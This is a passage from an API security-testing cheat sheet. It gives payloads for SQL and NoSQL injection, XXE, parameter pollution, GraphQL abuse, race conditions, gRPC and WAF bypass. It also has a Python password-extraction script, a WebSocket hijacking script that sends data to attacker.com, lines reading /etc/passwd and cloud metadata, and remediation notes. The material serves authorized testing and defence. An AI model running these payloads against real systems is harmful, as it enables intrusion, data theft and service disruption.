- OAuth2 Resource Owner Password flow (client handles credentials)
- State-changing endpoint (POST/PUT/PATCH/DELETE) with security: []
- Sensitive data in path parameters (SSN, card, password, token, key)
- File upload endpoints (multipart/form-data)
- Admin/internal endpoints in public spec (tagged admin, internal, management, debug)

---

## INJECTION ATTACKS

### SQL Injection in APIs
Common entry points: search parameters, filter fields, sort fields, ID parameters, `Content-Type: application/xml` bodies.

**Classic payloads**
```
' OR '1'='1
' OR 1=1--
'; DROP TABLE users; --
' UNION SELECT username,password FROM users--
1 AND SLEEP(5)--
1; WAITFOR DELAY '0:0:5'--
```

**SQLi through trusted third-party API response**
```python
# VULNERABLE: Third-party API response used in DB query without validation
db.execute(f"INSERT INTO cache (city, temp) VALUES ('{data['city']}', {data['temperature']})")
# If compromised third-party returns: {"city": "'; DROP TABLE users; --", "temperature": 72}
```

### NoSQL Injection (MongoDB)

**Authentication Bypass**
```json
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$in": ["", "password", "admin"]}}
{"$or": [{"username": "admin", "password": {"$ne": ""}}, {"username": "root", "password": {"$ne": ""}}]}
```

**$regex Exfiltration (char-by-char, like blind SQLi)**
```python
import requests, re, string

def extract_password(url, username):
    password = ""
    charset = string.ascii_letters + string.digits + string.punctuation
    while True:
        found = False
        for char in charset:
            payload = {"username": username,
                       "password": {"$regex": f"^{re.escape(password)}{re.escape(char)}"}}
            response = requests.post(url, json=payload)
            if response.status_code == 200:
                password += char
                found = True
                break
        if not found:
            break
    return password
```

**$where JavaScript Injection**
```json
{"username": "admin", "$where": "sleep(5000)"}
{"$where": "this.password.charAt(0) == 'p'"}
{"$where": "function() { while(true) {} }"}
```

MongoDB $where operators:

| Operator | Injection Use |
|----------|---------------|
| `$ne` | Match anything that is not empty |
| `$gt` | Match any non-empty string |
| `$in` | Match any of supplied values |
| `$regex` | Char-by-char exfiltration |
| `$where` | Server-side JavaScript execution |
| `$exists` | Probe schema fields |

### Server-Side Parameter Pollution (SSPP)
```
# Inject extra backend params via encoded & and =
query=test%26apikey%3Doverride%26role%3Dadmin

# Fragment truncation (strips trailing backend param like apikey)
query=test%23

# JSON body parameter injection
{"name":"John","role":"admin","isVerified":true,"updatedBy":"attacker-controlled"}

# Path traversal to internal endpoint
..%2F..%2Fadmin%2Fsecrets

# CRLF header injection
en\r\nX-Internal-Auth: attacker-override

# SSPP delimiter fuzz set
%26injected%3Dtrue   (&)
%23                  (#)
%3Fparam2%3Dvalue2   (?)
%3Doverride          (=)
%0d%0aInjected-Header:%20true  (CRLF)
```

### HTTP Parameter Pollution (HPP)
```
# Framework precedence testing (first/last/array/comma-join)
role=user&role=admin
cmd=ls&cmd=;cat+/etc/passwd         # WAF bypass: inject in second param
q=normal&q='+OR+1=1--              # ASP.NET comma-join SQLi
item_id=123&price=99.99&price=0.01  # Price override
email=victim@target.com&email=attacker@evil.com  # Password reset hijack
POST /api/users?role=user body: {"role":"admin"}  # Query vs body split
```

### JSON Interoperability Vulnerabilities
```json
{"role":"user","name":"Alice","role":"admin"}
# First-wins validator vs last-wins backend → role=admin

{"action":"read_public_data","action":"delete_all_users"}
# WAF inspects first action; backend executes last

{"type":"user","name":"attacker","roles":["_admin"],"roles":[]}
# CVE-2017-12635: CouchDB admin escalation (first-wins vs last-wins on roles)

{"user\u0000admin":"value"}
# Null-byte key truncation across parsers

{"id": 10000000000000001}
# IEEE-754 ID truncation — JS parses large integers to ...000 (IDOR via precision loss)

{"user_id": 999999999999999999999999999999}
# Large-integer precision confusion

{"amount": 1e2}
# Scientific notation type confusion

{"value": -0}
# Negative-zero handling differences
```

### XXE via API
```bash
# Test XML content type on JSON endpoint
curl -X POST "https://api.target.com/api/v1/users" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>'

# SSRF via XXE
curl -X POST "https://api.target.com/api/v1/users" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><user><name>&xxe;</name></user>'
```

### Insecure Deserialization
```
# Java serialized object: magic bytes AC ED 00 05 (hex)
# Content-Type: application/x-java-serialized-object
# PHP: a:2:{s:4:"name";s:5:"admin";}
# Python pickle: arbitrary code execution via crafted pickle stream
data = pickle.loads(response.content)  # from third-party API — RCE
```

---

## GRAPHQL-SPECIFIC ATTACKS

### Full Introspection Query
```graphql
{
  __schema {
    types {
      name kind
      fields {
        name
        type { name kind ofType { name kind } }
        args { name type { name kind } }
      }
    }
    mutationType {
      fields { name args { name type { name } } }
    }
  }
}
```

**What introspection reveals:**
- All queries and mutations including admin operations
- All types and sensitive data fields
- All arguments including hidden/undocumented parameters
- Relationships enabling authorization bypass through alternate paths
- Deprecated fields (may still function, lack current security controls)

### Introspection Bypass Techniques
```graphql
# Try __type instead of __schema
{ __type(name: "User") { fields { name type { name } } } }

# Via alias
{ a: __schema { types { name } } }

# Via fragment
fragment Introspect on __Schema { types { name } }
{ __schema { ...Introspect } }

# GET request (if POST introspection is blocked)
GET /graphql?query={__schema{types{name}}}
```

### Query Complexity / DoS Attacks
```graphql
# Circular reference exponential queries (50 friends × 7 levels = 50^7 ≈ 781 billion DB lookups)
{ user(id: 1) { friends { friends { friends { friends { friends { friends { friends { name email } } } } } } } } }

# Alias-based DoS (bypasses per-query rate limits — one request, 10,000 operations)
{
  a1: user(id: 1) { name email }
  a2: user(id: 2) { name email }
  # ... through a10000: user(id: 10000) { name email }
}

# Circular fragment reference (infinite recursion in some implementations)
fragment A on User { friends { ...B } }
fragment B on User { friends { ...A } }
{ user(id: 1) { ...A } }
```

### GraphQL Batching Attack (rate limit bypass)
```json
POST /graphql HTTP/1.1
Content-Type: application/json

[
  {"query": "mutation { login(user: \"admin\", pass: \"password1\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password2\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password3\") { token } }"}
]
// 1000 login attempts in one HTTP request — bypasses IP-based and per-request rate limits
```

### Field-Level Authorization Bypass
```graphql
# Direct access blocked
{ user(id: 42) { ssn } }  # Returns null/error — authorization check applied

# Access through relationship (authorization may not apply via relationship path)
{ order(id: 100) { customer { ssn } } }
```

### GraphQL Injection
```graphql
# SQL injection via filter argument
{ users(filter: "name = \"admin\" OR 1=1") { id email } }

# SSRF via URL field in mutation
{ generateReport(url: "http://169.254.169.254/latest/meta-data/") { content } }
```

---

## RACE CONDITIONS

### Single-Packet Attack (Kettle 2023, Black Hat USA)
**HTTP/2:** Buffer multiple request streams, send all HEADERS/DATA frames in one TCP write. Server processes all requests near-simultaneously from receive buffer — before any individual request completes.

**HTTP/1.1 fallback:** Open N connections, each missing final byte; send all final bytes simultaneously.

### TOCTOU — Financial Double-Spend
```
# Account has $1000; send 10 concurrent transfer requests for $1000 each
# All 10 read balance=$1000 → all pass check → all execute UPDATE
# Final balance: -$9000
10 × POST /api/transfer {"amount": 1000, "recipient": "attacker"}  [single-packet]
```

### Coupon/Gift Card Reuse
```
# 10 concurrent requests to redeem same $100 gift card
# All read redeemed=FALSE before any write redeemed=TRUE → $1000 from one $100 card
10 × POST /api/redeem {"code": "GIFT100"}  [single-packet]

# Single-use coupon applied to multiple orders
3 × POST /api/apply-coupon {"code": "SAVE50", "order_id": "order_1/2/3"}  [concurrent]
```

### Rate Limit Bypass via Race
```
# 100 concurrent requests arrive; all read current_count=0 before any increment
# Rate limit counter reads 0 for all 100 requests
100 × POST /api/endpoint (simultaneously via HTTP/2 single-packet)
```

### Parallel Account Creation
```
# Concurrent registration with same email → duplicate accounts
# Leads to: auth confusion, privilege differences, account takeover via password reset
100 × POST /api/register {"email": "same@email.com", "name": "attacker"}
```

### Distributed Race (Eventual Consistency)
```
# Window can be seconds/minutes in eventually-consistent systems
1. User changes password via Service A (writes to primary)
2. Attacker authenticates with old password via Service B (reads from stale replica)
3. Service B validates old password successfully
```

---

## WEBSOCKET ATTACKS

### Cross-Site WebSocket Hijacking (CSWSH)
```html
<!-- If WebSocket auth relies only on cookies (no CSRF token/origin check), CSWSH works -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() { ws.send(JSON.stringify({"action": "getMessages"})); };
ws.onmessage = function(event) {
    fetch('https://attacker.com/collect', {method:'POST', body: event.data});
};
</script>
```

### WebSocket Authorization Bypass
```javascript
// Establish connection with low-privilege user, then send admin messages
// Authorization may only be checked at handshake, not per-message
ws.send(JSON.stringify({"action": "getAdminData", "userId": "victim-id"}));
ws.send(JSON.stringify({"type": "subscribe", "channel": "admin-feed"}));

// Inject admin IDs after connection established
ws.send(JSON.stringify({"user_id": "admin-id", "action": "resetPassword"}));
```

### WebSocket Input Validation
```
# SQL injection via WebSocket message
{"query": "' OR '1'='1"}

# NoSQL injection
{"username": {"$ne": ""}}

# SSRF via URL in message
{"url": "http://169.254.169.254/latest/meta-data/"}

# Flood / resource exhaustion
for(var i=0; i<1000000; i++) ws.send('{"ping":"'+('A'.repeat(10000))+'"}');
```

---

## gRPC ATTACKS

### Discovery and Enumeration
```bash
# List services via reflection
grpcurl -plaintext target.com:50051 list
grpcurl target.com:443 list

# List methods for a service
grpcurl target.com:443 list userservice.UserService

# Describe a type
grpcurl target.com:443 describe userservice.UserService

# Check TLS/ALPN (gRPC requires HTTP/2)
openssl s_client -connect target.com:443 -alpn h2

# mTLS test
grpcurl -cert client.crt -key client.key -cacert ca.crt target.com:443 list
```

### Authentication Testing
```bash
# Bearer token
grpcurl -H "Authorization: Bearer $TOKEN" \
  target.com:443 userservice.UserService/GetUser

# Metadata injection — trust internal headers without verification
grpcurl -H "x-forwarded-for: 127.0.0.1" \
  -H "x-original-user: admin" \
  -H "x-internal-request: true" \
  -H "x-user-id: admin-user-id" \
  -H "x-user-role: admin" \
  target.com:443 userservice.UserService/ListUsers

# Metadata size DoS
grpcurl -H "x-large-header: $(python3 -c 'print(\"A\"*1000000)')" \
  target.com:443 userservice.UserService/GetUser
```

### IDOR and Injection via gRPC
```bash
# IDOR in unary RPC
grpcurl -d '{"user_id": "other-user-id"}' \
  -H "Authorization: Bearer $TOKEN" \
  target.com:443 userservice.UserService/GetUser

# SQL/filter injection
grpcurl -d '{"filter": "name = \"admin\" OR 1=1"}' \
  -H "Authorization: Bearer $TOKEN" \
  target.com:443 userservice.UserService/ListUsers

# Pagination abuse
grpcurl -d '{"page_size": 999999}' \
  -H "Authorization: Bearer $TOKEN" \
  target.com:443 userservice.UserService/ListUsers

# Server streaming resource exhaustion
for i in $(seq 1 100); do
  grpcurl -d '{"filter": ""}' -H "Authorization: Bearer $TOKEN" \
    target.com:443 userservice.UserService/ListUsers &
done

# CORS on gRPC-Web
curl -X OPTIONS https://target.com/grpc-web/UserService/GetUser \
  -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: x-grpc-web,content-type" -v
```

---

## PROTOCOL-SPECIFIC ATTACKS

### REST — Versioning & Method Override
```bash
# Method override via headers
POST /api/v1/users/1002 HTTP/1.1
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
_method=DELETE  # form parameter (some frameworks)

# Version downgrade — v1 may lack auth that v2 added
GET /api/v1/admin/users HTTP/1.1  # Compare behavior with GET /api/v2/admin/users
```

### SOAP/XML-RPC
```xml
<!-- XXE in SOAP body -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <getUser><name>&xxe;</name></getUser>
  </soapenv:Body>
</soapenv:Envelope>
```

### JSON-RPC
```json
{"jsonrpc": "2.0", "method": "getUser", "params": {"id": 1002}, "id": 1}

// Batch abuse
[
  {"jsonrpc": "2.0", "method": "getUser", "params": {"id": 1}, "id": 1},
  {"jsonrpc": "2.0", "method": "getUser", "params": {"id": 2}, "id": 2}
]
```

### Webhook Security
```bash
# Test signature validation bypass
# No signature: does webhook fire without HMAC header?
# Signature replay: reuse a valid signature on modified body
# Algorithm confusion: change HMAC algorithm in header

# SSRF via webhook delivery
POST /api/v1/webhooks
{"url": "http://169.254.169.254/latest/meta-data/", "events": ["*"]}
```

### Unsafe Consumption of Third-Party APIs
```python
# VULNERABLE: Third-party API response used in DB query without validation
response = requests.get("https://partner-api.com/data").json()
db.execute(f"INSERT INTO cache (name) VALUES ('{response['name']}')")
# If partner API is compromised: response['name'] = "'; DROP TABLE users; --"

# VULNERABLE: Following redirects without validation
response = requests.get(partner_url, allow_redirects=True)
# Partner redirects to http://169.254.169.254/latest/meta-data/ → SSRF

# VULNERABLE: Fetching partner-controlled URLs
for item in partner_data['items']:
    image_response = requests.get(item['image_url'])
    # item['image_url'] could be "http://169.254.169.254/..."

# VULNERABLE: Unsafe deserialization of partner data
data = pickle.loads(response.content)  # Arbitrary code execution
```

---

## WAF BYPASS TECHNIQUES

### SQL Injection Bypasses
```
# Case variation
sElEcT * fRoM users

# Comment insertion
SE/**/LECT * FR/**/OM users
SE%00LECT * FROM users

# URL encoding
%27 OR %271%27%3D%271

# Double encoding
%2527 OR 1=1

# Whitespace alternatives
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  # Tab
SELECT%0ausername%0aFROM%0ausers  # Newline
```

### HPP WAF Bypass
```
# Hide injection in second duplicate parameter (WAF inspects first only)
cmd=ls&cmd=;cat+/etc/passwd
```

### SSRF WAF Bypass
```
http://2852039166/          # Decimal
http://0251.0376.0251.0376/ # Octal
http://0xa9.0xfe.0xa9.0xfe/ # Hex
http://[::ffff:a9fe:a9fe]/  # IPv6
http://anything@169.254.169.254/
```

---

## FALSE POSITIVE ELIMINATION

### Never Report These Alone (require chaining into real impact)
- GraphQL introspection enabled by itself
- Missing security headers (X-Frame-Options on JSON API)
- Version/banner disclosure with no working exploit
- Verbose errors with no sensitive data
- CORS wildcard with no credentialed-exfil PoC
- Rate-limit absence on non-critical endpoints
- Self-only data access (you can read only your own data)
- TLS cipher concerns without downgrade PoC
- Autocomplete-on-password
- Clickjacking on non-sensitive pages

### BOLA False Positive Checklist
```
[ ] Is the data returned sensitive (not intentionally public)?
[ ] Does unauthenticated access return the same data? (profile might be public)
[ ] Is this test/staging with relaxed config?
[ ] Does the application's privacy model treat these as public resources?
[ ] Can you access private fields (email, SSN, payment) or only public ones?
```

### SSRF False Positive Checklist
```
[ ] Was the SSRF webhook actually triggered (not just created)?
[ ] Is there network-level protection (IMDSv2, security groups, VPC rules)?
[ ] Did you get a response from the internal target?
[ ] Can you exfiltrate actual credentials/data?
[ ] Blind SSRF: did you receive an OOB DNS/HTTP callback?
```

### SQLi False Positive Checklist
```
[ ] Is the 400 response a validation error (catching payload) or a SQL error?
[ ] Did a time-based payload actually cause delay or is it normal latency?
[ ] Does the UNION SELECT return additional rows?
[ ] Is a WAF blocking the payload (try different encoding)?
```

### Evidence Standards (ALL required before reporting)
1. Reproduced from scratch in a fresh session
2. Impact is real — show actual data returned, not just 200 OK
3. Working request/response pair captured (Burp history, curl output)
4. For BOLA: show other user's actual private data
5. For SSRF: show internal response content or IAM creds
6. For JWT: show forged token accepted with elevated privileges
7. For race conditions: show state change happened multiple times (use second account to verify)
8. False positive checks completed

### False Positive Rate Benchmarks
| FP Rate | Quality | Dev Trust | Remediation |
|---------|---------|-----------|-------------|
| < 5% | Excellent | High | High |
| 5-15% | Good | Moderate | Moderate |
| 15-30% | Acceptable | Low | Low |
| > 50% | Unacceptable | None | Negative |

Automated scans alone: 40-60% FP rate. Manual verification required.

---

## TESTING METHODOLOGY

### Pre-Engagement
- Read full scope: every host, API, endpoint, version, subdomain, environment
- Confirm permitted API versions, subdomains, environments (prod vs staging)
- Note excluded endpoints, rate-limit rules, required test markers/headers
- Obtain two accounts: attacker (User A) + victim (User B, different org/group)

### Authorization Matrix
For each endpoint: list HTTP methods × roles × expected behavior. Test every cell systematically.

### Attack Surface Priority Order
1. Auth/token endpoints (login, token, password-reset, MFA, refresh, register)
2. State-changing endpoints (POST/PUT/PATCH/DELETE) — CSRF, authz, injection, race
3. File upload/download endpoints — path traversal, type bypass, SSRF, IDOR
4. Webhook/callback endpoints — SSRF, replay, signature validation
5. Admin/management endpoints — privilege escalation, missing auth
6. GraphQL — introspection, complexity, field-level authz

### STRIDE Threat Model for APIs
```
S (Spoofing):       Auth bypass, JWT forgery, session hijacking, OAuth manipulation
T (Tampering):      Parameter tampering, injection, mass assignment, IDOR write
R (Repudiation):    Missing audit logs, log injection, missing correlation IDs
I (Information):    Excessive data exposure, verbose errors, debug endpoints
D (DoS):           Missing rate limits, GraphQL complexity, ReDoS, large payloads
E (Elevation):      BOLA, BFLA, mass assignment → role elevation, JWT claim manipulation
```

### Reporting Standards
- **Title**: `[Vuln Class] in [API endpoint] allows [actor] to [impact]`
- **No theoretical language**: "An attacker CAN [action] by [method]", not "could potentially"
- **Always include PoC**: show actual other user's data / internal response / forged token
- **Two accounts for auth bugs**: show cross-account access explicitly
- **CVSS must match actual impact**
- **Separate bugs = separate reports**; combine only when ONE proven chain

---

## FRAMEWORK-SPECIFIC CVE HIGHLIGHTS

| Framework | CVE | Description | Affected Versions |
|-----------|-----|-------------|-------------------|
| PyJWT | CVE-2022-29217 | Algorithm confusion — alg not validated without explicit list | < 2.4.0 |
| jsonwebtoken (Node) | CVE-2016-10555 | Algorithm confusion RS256→HS256 | < 7.4.3 |
| Java (SunEC) | CVE-2022-21449 | ECDSA psychic signatures r=0,s=0 accepted | Java 15-18 (before 17.0.3/18.0.1) |
| jwt-go (Go) | CVE-2015-9235 | alg:none accepted | < 2.0.0 |
| CouchDB | CVE-2017-12635 | JSON duplicate key admin escalation | < 2.1.1 |
| Spring Boot Actuator | — | heapdump/env/mappings exposed without auth | Misconfigured deployments |
| GraphQL (various) | — | Introspection + complexity DoS | No complexity limits configured |

---

## TOOLS REFERENCE

| Tool | Purpose | Key Command |
|------|---------|-------------|
| **Burp Suite Pro** | Proxy, scanner, Intruder | Proxy + BApp: Param Miner, GAP, JWT Editor |
| **OWASP ZAP** | Proxy + OpenAPI plugin | Active scan with OpenAPI spec loaded |
| **ffuf** | Endpoint brute-force | `ffuf -u https://api.target.com/FUZZ -w wordlist.txt -mc 200,201,401,403,405` |
| **feroxbuster** | Recursive brute-force | `feroxbuster -u https://api.target.com -w wordlist.txt --depth 3 --rate-limit 50` |
| **gobuster** | Dir/VHOST brute-force | `gobuster dir -u https://api.target.com -w wordlist.txt -s "200,201,401,403,405"` |
| **Arjun** | Hidden parameter discovery | `arjun -u https://api.target.com/api/v1/users -m POST` |
| **x8** | JSON/header param discovery | `x8 -u "https://api.target.com/users" -w params.txt --json` |
| **subfinder** | Subdomain enumeration | `subfinder -d target.com -all -o subdomains.txt` |
| **amass** | ASN + subdomain enum | `amass enum -passive -d target.com` |
| **dnsx** | DNS resolution | `cat subdomains.txt \| dnsx -a -resp -o resolved.txt` |
| **httpx** | HTTP probing | `cat subdomains.txt \| httpx -ports 80,443,8080,8443 -tech-detect` |
| **LinkFinder** | JS endpoint extraction | `python3 linkfinder.py -i https://target.com -o cli` |
| **sourcemapper** | Source map extraction | `sourcemapper -url https://target.com/main.js.map -output ./src` |
| **jwt_tool** | JWT testing | `python3 jwt_tool.py <token> -C -d wordlist.txt` |
| **hashcat** | JWT secret cracking | `hashcat -m 16500 jwt.txt rockyou.txt` |
| **grpcurl** | gRPC testing | `grpcurl -plaintext target.com:50051 list` |
| **Nuclei** | Template-based scanning | `nuclei -u https://api.target.com -t api-security/` |
| **truffleHog** | Secret scanning | `trufflehog github --org target --only-verified` |
| **gitleaks** | Git secret detection | `gitleaks detect --source /path/to/repo --report-format json` |
| **oasdiff** | OpenAPI spec diffing | `oasdiff diff spec_v1.json spec_v2.json --format json` |
| **Schemathesis** | Schema-based fuzzing | `schemathesis run https://api.target.com/openapi.json --checks all` |

---

## CONTINUOUS MONITORING

### OpenAPI Spec Change Detection
```bash
go install github.com/tufin/oasdiff@latest
oasdiff diff spec_v1.json spec_v2.json
oasdiff breaking spec_v1.json spec_v2.json
oasdiff changelog spec_v1.json spec_v2.json --format json > api_changes.json
```

**Security-relevant changes to alert on:**
- New endpoints added (new attack surface)
- Authentication removed from existing endpoints
- Security scheme changes
- New admin/internal endpoints in public spec

---

## REMEDIATION QUICK REFERENCE

| Vulnerability | Primary Fix |
|---------------|-------------|
| BOLA/IDOR | Server-side authorization check on EVERY endpoint × method: `if resource.owner != current_user: abort(403)` |
| Mass Assignment | Explicit allowlist of writable fields (Strong Parameters, DTO pattern, Joi schema) |
| JWT alg:none | `algorithms=["RS256"]` explicit allowlist in jwt.decode(); never accept from token header |
| JWT algorithm confusion | Separate key objects for HMAC vs RSA; require explicit algorithm in verify call |
| JWT kid injection | Validate kid against allowlist; parameterized query for DB lookup; no path construction |
| SSRF | Resolve DNS once, validate IP (private/loopback/link-local blocked), use IP for request; AWS IMDSv2 |
| NoSQL injection | Cast inputs to expected types; Pydantic/Joi schema validation; disable `$where` in MongoDB |
| Race conditions | Database-level atomic operations (`SELECT ... FOR UPDATE`); Redis SETNX for single-use codes |
| GraphQL complexity | Query complexity limits (max ~100); depth limits (max 7); disable batching or limit batch size |
| Mass resource consumption | Per-IP + per-user rate limits with exponential backoff; pagination size limits |
| BFLA | Role-based access control checked for every function, not just at the route level |
| Unsafe API consumption | Validate all third-party data with schema; parameterized queries; disable redirect following |
